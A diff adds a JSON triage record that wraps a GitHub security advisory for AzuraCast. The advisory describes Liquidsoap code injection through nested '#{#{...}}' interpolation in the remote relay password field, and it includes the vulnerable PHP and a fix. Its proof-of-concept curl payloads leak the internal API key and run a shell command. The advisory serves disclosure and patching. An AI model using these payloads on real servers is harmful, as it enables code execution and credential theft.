@@ -1,0 +1,55 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": null, \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}], \"description\": \"## Summary\\n\\nThe `cleanUpString()` method in `ConfigWriter.php` uses an ungreedy regex to strip Liquidsoap string interpolation patterns (`#{...}`) from user input. This regex can be bypassed via nested interpolation syntax (`#{#{EXPR}}`), allowing injection of arbitrary Liquidsoap code. Commit `ff49ef4` migrated most user-controlled fields to the safe `toRawString()` method but left the remote relay password field using the vulnerable `cleanUpString()`. A user with the `RemoteRelays` station permission can achieve arbitrary code execution in the Liquidsoap process, leak internal API keys, or disrupt station operation.\\n\\n## Details\\n\\n### The Vulnerable Sanitizer\\n\\n`cleanUpString()` at `backend/src/Radio/Backend/Liquidsoap/ConfigWriter.php:1349-1367`:\\n\\n```php\\npublic static function cleanUpString(?string $string): string\\n{\\n    $string = str_replace(['\\\"', \\\"\\\\n\\\", \\\"\\\\r\\\"], ['\\\\'', '', ''], $string ?? '');\\n\\n    // Remove strings that are interpolated\\n    $string = preg_replace(\\n        '/#{(.*)}/U',   // Ungreedy: matches minimum chars to first }\\n        '$1',\\n        $string\\n    );\\n\\n    $string = preg_replace(\\n        '/\\\\$\\\\((.*)\\\\)/U',\\n        '$1',\\n        $string ?? ''\\n    );\\n\\n    return $string ?? '';\\n}\\n```\\n\\nThe `/U` (ungreedy) flag causes `.*` to match the **minimum** characters until the first `}`. With nested input `#{#{EXPR}}`:\\n\\n1. Regex finds `#{` at position 0\\n2. Ungreedy `.*` matches `#{EXPR` (stops at the **first** `}`)\\n3. Full match consumed: `#{#{EXPR}` — replacement with capture group `$1` yields: `#{EXPR`\\n4. The trailing `}` is appended by the regex engine (it was outside the match)\\n5. **Final result: `#{EXPR}`** — a valid Liquidsoap string interpolation expression\\n\\n### The Incomplete Patch\\n\\nCommit `ff49ef4` (\\\"Use raw strings for user-input strings to avoid interpolation\\\", 2026-03-06) correctly migrated host, username, mount, name, description, genre, and URL fields to `toRawString()`. However, the password field was left using `cleanUpString()`:\\n\\n`ConfigWriter.php:1208-1215`:\\n```php\\n$password = self::cleanUpString($source->password);  // Still vulnerable\\n\\n$adapterType = $source->adapterType;\\nif (FrontendAdapters::Shoutcast === $adapterType) {\\n    $password .= ':#' . $id;\\n}\\n\\n$outputParams[] = 'password = \\\"' . $password . '\\\"';  // Double-quoted = interpolated\\n```\\n\\nThe password is embedded in a Liquidsoap **double-quoted string**, which evaluates `#{...}` interpolation expressions.\\n\\n### Why toRawString() Is Safe\\n\\n`toRawString()` uses Liquidsoap raw string delimiters (`{str_xxxxx|...|str_xxxxx}`) which **do not perform interpolation**, making them immune to this attack class.\\n\\n### The Input Path\\n\\n1. Attacker sends `PUT /api/station/{station_id}/remote/{id}` with `source_password` containing the nested payload\\n2. Entity setter truncates to 100 chars via `mb_substr` (payloads fit within this limit)\\n3. No validation on password content\\n4. On station config regeneration, `ConfigWriter::getOutputString()` calls `cleanUpString()` on the password\\n5. Bypass produces valid interpolation, embedded in double-quoted Liquidsoap string\\n6. Liquidsoap evaluates the interpolation when loading the config\\n\\n## PoC\\n\\n### Step 1: API Key Disclosure (38 chars)\\n\\n```bash\\n# Set malicious password on an existing remote relay\\ncurl -X PUT \\\"http://azuracast.local/api/station/1/remote/1\\\" \\\\\\n  -H \\\"X-API-Key: $API_KEY\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"source_password\\\": \\\"#{#{settings.azuracast.api_key()}}\\\"}'\\n```\\n\\nAfter `cleanUpString()` processing, the password becomes `#{settings.azuracast.api_key()}`.\\n\\nWhen Liquidsoap loads the config, the generated line:\\n```\\npassword = \\\"#{settings.azuracast.api_key()}\\\"\\n```\\nevaluates to the internal API key value, which is then sent as the password to the remote relay server — observable by the attacker if they control the relay endpoint.\\n\\n### Step 2: Remote Code Execution (54 chars)\\n\\n```bash\\n# RCE payload using string.char() to bypass quote filtering\\ncurl -X PUT \\\"http://azuracast.local/api/station/1/remote/1\\\" \\\\\\n  -H \\\"X-API-Key: $API_KEY\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"source_password\\\": \\\"#{#{process.run(string.char(105)^string.char(100))}}\\\"}'\\n```\\n\\nAfter processing: `#{process.run(string.char(105)^string.char(100))}` → executes `id` command.\\n\\n`string.char()` and the `^` concatenation operator are used to build the command string without double quotes (which `cleanUpString` replaces with single quotes, and Liquidsoap doesn't support single-quoted strings).\\n\\n### Step 3: Trigger config regeneration\\n\\nRestart the station or modify any station setting to force Liquidsoap config regeneration. The payload executes when Liquidsoap loads the new config.\\n\\nThe same bypass works with `$($(EXPR))` via the second regex `/\\\\$\\\\((.*)\\\\)/U`.\\n\\n## Impact\\n\\n- **Arbitrary code execution** within the Liquidsoap process container via `process.run()`\\n- **Internal API key disclosure** via `settings.azuracast.api_key()`, granting the attacker full internal API access to the station\\n- **File read/write** within the Liquidsoap container via Liquidsoap's file operations\\n- **Station disruption** — malicious config can crash the Liquidsoap process\\n- **Low privilege bar** — requires only the `RemoteRelays` station permission, not global admin\\n\\n## Recommended Fix\\n\\nReplace `cleanUpString()` with `toRawString()` for the password field, consistent with the fix applied to all other fields in commit `ff49ef4`. The Shoutcast suffix append needs adjustment to work with raw strings:\\n\\n```php\\n// Before (vulnerable):\\n$password = self::cleanUpString($source->password);\\n$adapterType = $source->adapterType;\\nif (FrontendAdapters::Shoutcast === $adapterType) {\\n    $password .= ':#' . $id;\\n}\\n$outputParams[] = 'password = \\\"' . $password . '\\\"';\\n\\n// After (safe):\\n$password = $source->password ?? '';\\n$adapterType = $source->adapterType;\\nif (FrontendAdapters::Shoutcast === $adapterType) {\\n    $password .= ':#' . $id;\\n}\\n$outputParams[] = 'password = ' . self::toRawString($password);\\n```\\n\\nThis uses the raw string delimiter which prevents all interpolation, matching the approach already used for host, username, mount, and all other user-controlled fields.\\n\\nAdditionally, consider removing `cleanUpString()` entirely or marking it as deprecated, since `toRawString()` is the correct approach for all Liquidsoap string values. Any remaining callers should be migrated.\", \"ghsa_id\": \"GHSA-q4ph-8x8g-95f8\", \"github_reviewed_at\": \"2026-05-04T21:19:55Z\", \"html_url\": \"https://github.com/advisories/GHSA-q4ph-8x8g-95f8\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-q4ph-8x8g-95f8\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-04T21:19:55Z\", \"references\": [\"https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-q4ph-8x8g-95f8\", \"https://github.com/AzuraCast/AzuraCast/commit/d6b8422fc2c36269df9d1adec89dfbba58828915\", \"https://github.com/advisories/GHSA-q4ph-8x8g-95f8\"], \"repository_advisory_url\": \"https://api.github.com/repos/AzuraCast/AzuraCast/security-advisories/GHSA-q4ph-8x8g-95f8\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/AzuraCast/AzuraCast\", \"summary\": \"AzuraCast Vulnerable to Liquidsoap Code Injection via Incomplete cleanUpString-to-toRawString Migration in Remote Relay Password Field\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-04T21:19:55Z\", \"url\": \"https://api.github.com/advisories/GHSA-q4ph-8x8g-95f8\", \"vulnerabilities\": [{\"first_patched_version\": \"0.23.6\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"azuracast/azuracast\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.23.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-q4ph-8x8g-95f8",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "azuracast/azuracast: <= 0.23.5"
+    ],
+    "authentication_required": true,
+    "cves": [],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "azuracast/azuracast"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.138203Z",
+  "provenance": {
+    "content_sha256": "943d286cab29d0b3012742fa3c5803a35b2eab5eb0b3aff69eaa39b55ea6bea1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-04T21:19:55Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-q4ph-8x8g-95f8",
+  "status": "active",
+  "title": "AzuraCast Vulnerable to Liquidsoap Code Injection via Incomplete cleanUpString-to-toRawString Migration in Remote Relay Password Field",
+  "updated_at": "2026-05-04T21:19:55Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-q4ph-8x8g-95f8"
+}
